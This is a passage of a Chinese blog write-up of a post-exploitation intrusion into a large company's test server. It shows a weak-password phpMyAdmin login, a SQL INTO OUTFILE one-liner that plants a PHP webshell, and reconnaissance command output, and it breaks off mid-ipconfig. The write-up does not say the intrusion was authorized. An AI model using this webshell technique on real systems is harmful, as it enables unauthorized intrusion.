<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>针对国内一大厂的后渗透 - 持续 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>28</span>
<span class=rest>Dec 2017</span></div></div><div class=matter><h1 class=title>针对国内一大厂的后渗透 - 持续</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-信息搜集---后渗透>0x01 信息搜集 - 后渗透</a></li><li><a href=#0x02-后渗透的开始>0x02 后渗透的开始</a><ol><li><a href=#权限维持>权限维持</a></li></ol></li><li><a href=#0x03-关于权限维持的思考>0x03 关于权限维持的思考</a></li><li><a href=#0x04-端口转发之portfwd详解>0x04 端口转发之portfwd详解</a><ol><li><a href=#使用portfwd>使用portfwd</a></li><li><a href=#端口扫描>端口扫描</a></li></ol></li><li><a href=#0x05-meterpreter>0x05 Meterpreter</a><ol><li><a href=#获取hash的几个方式>获取Hash的几个方式</a></li></ol></li><li><a href=#0x06-powershell技巧>0x06 PowerShell技巧</a><ol><li><a href=#外部powershell脚本>外部Powershell脚本</a></li></ol></li><li><a href=#0x07-再一次克服困难>0x07 再一次克服困难</a></li><li><a href=#0x08-开始扫描>0x08 开始扫描</a></li><li><a href=#0x09-信息搜集基本结果>0x09 信息搜集基本结果</a><ol><li><a href=#轻松获得域控服务器>轻松获得域控服务器</a></li></ol></li><li><a href=#0x10-内网核心>0x10 内网核心</a></li><li><a href=#0x12-配置引发的隐患>0x12 配置引发的隐患</a></li><li><a href=#0x13-需要搜集的信息>0x13 需要搜集的信息</a></li><li><a href=#0x14-总结>0x14 总结</a></li></ol></nav></aside><h2 id=0x00-前言>0x00 前言</h2><p>此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。</p><h2 id=0x01-信息搜集---后渗透>0x01 信息搜集 - 后渗透</h2><p>首先我们后渗透阶段的开始表现在 拥有一个Webshell或者通过其他漏洞获取了某些操作服务器文件的权限，亦或者能够直接反弹Shell</p><p>这里我挑选了一个某厂边缘处的一个测试环境，在这之前我做了大量的信息搜集，没有选择直接去挖掘、利用漏洞</p><ul><li>操作系统</li><li>Web服务器版本</li><li>PHP版本</li><li>绝对路径</li><li>子域名</li><li>开放端口 - 发现开启了防火墙</li></ul><p>扫描到它存在<code>phpMyadmin</code>，弱口令登录进入，通过常规手法SQL写入shell。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#e6db74>&#39;&lt;?php @assert($_POST[&#34;qyxmsq56dhaye3&#34;]);?&gt;&#39;</span> <span style=color:#66d9ef>INTO</span> OUTFILE <span style=color:#e6db74>&#39;D:/WWW/***/master/&#39;</span>;
</span></span></code></pre></td></tr></table></div></div><p>通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>D:\WWW\***\master\&gt; net user /domain
</span></span><span style=display:flex><span>这项请求将在域 WORKGROUP 的域控制器处理。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>发生系统错误 1355。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>指定的域不存在，或无法联系。
</span></span></code></pre></td></tr></table></div></div><p>通过上面的结果可以看到该服务器并不是域成员</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>D:\WWW\***\master\&gt; query user
</span></span><span style=display:flex><span>* 没有用户
</span></span></code></pre></td></tr></table></div></div><p>没有管理员在线</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>
</span></span><span style=display:flex><span>D:\WWW\***\master\&gt; netstat -ano
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>活动连接
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  协议  本地地址          外部地址        状态           PID
</span></span><span style=display:flex><span>  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1692
</span></span><span style=display:flex><span>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1584
</span></span><span style=display:flex><span>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       12
</span></span><span style=display:flex><span>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
</span></span><span style=display:flex><span>  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1740
</span></span><span style=display:flex><span>  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       3740
</span></span><span style=display:flex><span>  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       828
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       1052
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       1108
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49160          0.0.0.0:0              LISTENING       932
</span></span><span style=display:flex><span>  TCP    0.0.0.0:49161          0.0.0.0:0              LISTENING       924
</span></span><span style=display:flex><span>  TCP    10.***.63.178:139      0.0.0.0:0              LISTENING       4
</span></span><span style=display:flex><span>  TCP    10.***.191.178:139     0.0.0.0:0              LISTENING       4
</span></span><span style=display:flex><span>  TCP    10.***.191.178:58359   *.*.*.*:****     ESTABLISHED     5576
</span></span><span style=display:flex><span>  TCP    10.***.191.178:58362   *.*.*.*:****     ESTABLISHED     4700
</span></span><span style=display:flex><span>  TCP    *.*.*.*:****     *.*.*.*:****    TIME_WAIT       0
</span></span><span style=display:flex><span>  TCP    *.*.*.*:****     *.*.*.*:****    ESTABLISHED     1584
</span></span><span style=display:flex><span>  TCP    169.254.112.31:139     0.0.0.0:0              LISTENING       4
</span></span><span style=display:flex><span>  TCP    169.254.191.36:139     0.0.0.0:0              LISTENING       4
</span></span><span style=display:flex><span>  TCP    [::]:21                [::]:0                 LISTENING       1692
</span></span><span style=display:flex><span>  TCP    [::]:80                [::]:0                 LISTENING       1584
</span></span><span style=display:flex><span>  TCP    [::]:135               [::]:0                 LISTENING       12
</span></span><span style=display:flex><span>  TCP    [::]:445               [::]:0                 LISTENING       4
</span></span><span style=display:flex><span>  TCP    [::]:3389              [::]:0                 LISTENING       3740
</span></span><span style=display:flex><span>  TCP    [::]:47001             [::]:0                 LISTENING       4
</span></span><span style=display:flex><span>  TCP    [::]:49152             [::]:0                 LISTENING       828
</span></span><span style=display:flex><span>  TCP    [::]:49153             [::]:0                 LISTENING       1052
</span></span><span style=display:flex><span>  TCP    [::]:49154             [::]:0                 LISTENING       1108
</span></span><span style=display:flex><span>  TCP    [::]:49160             [::]:0                 LISTENING       932
</span></span><span style=display:flex><span>  TCP    [::]:49161             [::]:0                 LISTENING       924
</span></span><span style=display:flex><span>  UDP    0.0.0.0:500            *:*                                    1108
</span></span><span style=display:flex><span>  UDP    0.0.0.0:4500           *:*                                    1108
</span></span><span style=display:flex><span>  UDP    0.0.0.0:5355           *:*                                    1248
</span></span><span style=display:flex><span>  UDP    10.***.63.178:137      *:*                                    4
</span></span><span style=display:flex><span>  UDP    10.***.63.178:138      *:*                                    4
</span></span><span style=display:flex><span>  UDP    10.***.191.178:137     *:*                                    4
</span></span><span style=display:flex><span>  UDP    10.***.191.178:138     *:*                                    4
</span></span><span style=display:flex><span>  UDP    169.254.112.31:137     *:*                                    4
</span></span><span style=display:flex><span>  UDP    169.254.112.31:138     *:*                                    4
</span></span><span style=display:flex><span>  UDP    169.254.191.36:137     *:*                                    4
</span></span><span style=display:flex><span>  UDP    169.254.191.36:138     *:*                                    4
</span></span><span style=display:flex><span>  UDP    [::]:500               *:*                                    1108
</span></span><span style=display:flex><span>  UDP    [::]:4500              *:*                                    1108
</span></span><span style=display:flex><span>  UDP    [::]:5355              *:*                                    1248
</span></span></code></pre></td></tr></table></div></div><p>可以发现有3389端口，我尝试了去直接连接，但是被拒绝了，绝对是防火墙做了入站限制</p><p>这个尝试是有风险的，因为你不知道下一步的操作能够为自己带来怎样的走向</p><p>再查看一下网卡：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>D:\WWW\****\master\&gt; ipconfig
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Windows IP 配置
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>以太网适配器 本地连接 4:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>   本地链接 IPv6 地址. . . . . . . . : fe80::35ec:****:321d%17
</span></span><span style=display:flex><span>   IPv4 地址 . . . . . . . . . . . . : 10.159.191.178
</span></span><span style=display:flex><span>   子网掩码  . . . . . . . . . . . . : 255.255.255.128
</span></span><span style=display:flex><span>   IPv4 地址 . . . . . . . . . . . . : ****
</span></span><span style=display:flex><span>   子网掩码  . . . . . . . . . . . . : 255.255.255.255
</span></span><span style=display:flex><span>   默认网关. . . . . . . . . . . . . : 10.159.191.254
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>以太网适配器 本地连接 3:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>   本地链接 IPv6 地址. . . . . . . . : fe80::****:701f%15
</span></span><span style=display:flex><span>   自动配置 IPv4 地址  . . . . . . . : 169.254.112.31
</span></span><span style=display:flex><span>   子网掩码  . . . . . . . . . . . . : 255.255.0.0
</span></span><span style=display:flex><span>   默认网关. . . . . . . . . . . . . : 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>以太网适配器 本地连接 2:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>   本地链接 IPv6 地址. . . . . . . . : fe80::****:7c4d:bf24%13
</span></span><span style=display:flex><span>   自动配置 IPv4 地址  . . . . . . . : 169.254.191.36
</span></span><span style=display:flex><span>   子网掩码  . . . . . . . . . . . . : 255.255.0.0
</span></span><span style=display:flex><span>   默认网关. . . . . . . . . . . . . : 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>以太网适配器 本地连接:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   连接特定的 DNS 后缀 . . . . . . . : 
</span></span><span style=display:flex><span>   本地链接 IPv6 地址. . . . . . . . : fe80::****:b5e7:5894%11
</span></span><span style=display:flex><span>   IPv4 地址 . . . . . . . . . . . . : 10.159.63.178
</span></span><span style=display:flex><span>   子网掩码  . . . . . . . . . . . . : 255.255.255.128
</span></span><span style=display:flex><span>   默认网关. . . . . . . . . . . . . : 
</span></span><span style=display:flex><span>
